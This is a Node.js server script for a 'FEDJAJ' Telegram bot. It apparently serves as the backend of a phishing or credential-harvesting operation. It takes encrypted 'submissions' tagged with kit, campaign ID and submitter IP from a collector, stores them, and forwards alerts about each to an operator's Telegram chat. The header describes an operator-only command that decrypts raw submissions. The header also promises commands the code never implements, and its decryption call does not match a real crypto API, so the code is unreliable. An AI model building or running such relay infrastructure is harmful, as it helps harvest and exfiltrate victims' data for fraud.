#!/usr/bin/env node
/**
 * FEDJAJ Telegram bot — receives ghost TXNs from collector, alerts operator.
 *
 * Usage: TG_BOT_TOKEN=... TG_CHAT_ID=... node telegram-bot.js
 *
 * Endpoints:
 *   POST /webhook        -> collector sends ghost TXN here
 *   POST /alert          -> manual alert (any JSON body)
 *   GET  /health         -> status
 *
 * The bot also listens for Telegram messages:
 *   /status             -> last N submissions
 *   /export             -> dump all metadata as JSON
 *   /raw <id>           -> decrypt + show one submission (operator only)
 *
 * The decryption key comes from COLLECTOR_KEY env var (same as worker).
 */

const http = require('http');
const crypto = require('crypto');
const { URL } = require('url');

const BOT_TOKEN = process.env.TG_BOT_TOKEN || '';
const CHAT_ID = process.env.TG_CHAT_ID || '';
const KEY_HEX = process.env.COLLECTOR_KEY || '';
const PORT = parseInt(process.env.TG_PORT || '8766', 10);

const API = `https://api.telegram.org/bot${BOT_TOKEN}`;

let submissions = [];
const MAX_STORED = 500;

function hexToBuf(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  return bytes;
}

function base64UrlToBuf(b64) {
  const pad = b64.padEnd(Math.ceil(b64.length / 4) * 4, '=');
  const normalized = pad.replace(/-/g, '+').replace(/_/g, '/');
  const bin = atob(normalized);
  const buf = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
  return buf;
}

function decrypt(encJson) {
  const { iv, tag, data } = JSON.parse(encJson);
  const keyBytes = hexToBuf(KEY_HEX);
  const ivBuf = base64UrlToBuf(iv);
  const tagBuf = base64UrlToBuf(tag);
  const dataBuf = base64UrlToBuf(data);
  const ct = new Uint8Array(dataBuf.length + tagBuf.length);
  ct.set(dataBuf);
  ct.set(tagBuf, dataBuf.length);
  const plain = crypto.decrypt('aes-256-gcm', keyBytes, ivBuf, ct.slice(0, -16), ct.slice(-16));
  return JSON.parse(plain);
}

async function tg(method, body) {
  const res = await fetch(`${API}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  return res.json();
}

async function sendMessage(text) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  await tg('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' });
}

async function handleWebhook(req) {
  try {
    let body = '';
    for await (const chunk of req) body += chunk;
    const data = JSON.parse(body);
    const meta = data.meta || {};
    const tx = meta.tx || 'UNKNOWN';
    const kit = meta.kit || 'unknown';
    const camp = meta.campaign_id || 'unknown';

    submissions.push({ ...meta, received_at: new Date().toISOString() });
    if (submissions.length > MAX_STORED) submissions.shift();

    const msg = `✅ <b>FEDJAJ TXN</b>\n` +
      `TX: <code>${tx}</code>\n` +
      `Kit: ${kit}\n` +
      `Camp: ${camp}\n` +
      `IP: ${meta.ip || '?'}\n` +
      `Time: ${new Date().toLocaleString()}`;
    await sendMessage(msg);

    return json({ ok: true });
  } catch (e) {
    return json({ error: String(e) }, 400);
  }
}

async function handleAlert(req) {
  try {
    let body = '';
    for await (const chunk of req) body += chunk;
    const data = JSON.parse(body);
    const text = data.text || JSON.stringify(data);
    await sendMessage(`⚠️ <b>ALERT</b>\n${text}`);
    return json({ ok: true });
  } catch (e) {
    return json({ error: String(e) }, 400);
  }
}

async function handleStatus() {
  const last = submissions.slice(-10).map(s =>
    `${s.tx} | ${s.kit} | ${s.campaign_id || '?'}`
  ).join('\n');
  return json({ count: submissions.length, last });
}

function json(body, status = 200) {
  return {
    status,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  };
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost`);
  const method = req.method;

  res.setHeader('Content-Type', 'application/json');

  if (method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  if (method === 'GET' && url.pathname === '/health') {
    res.writeHead(200);
    res.end(JSON.stringify({ status: 'running', stored: submissions.length }));
    return;
  }

  if (method === 'POST' && url.pathname === '/webhook') {
    const r = await handleWebhook(req);
    res.writeHead(r.status);
    res.end(r.body);
    return;
  }

  if (method === 'POST' && url.pathname === '/alert') {
    const r = await handleAlert(req);
    res.writeHead(r.status);
    res.end(r.body);
    return;
  }

  if (method === 'GET' && url.pathname === '/status') {
    const r = await handleStatus();
    res.writeHead(200);
    res.end(r.body);
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ error: 'not found' }));
});

server.listen(PORT, () => {
  console.log(`FEDJAJ Telegram bot running on port ${PORT}`);
  console.log(`Forward webhook: https://<worker-url>/webhook -> localhost:${PORT}/webhook`);
});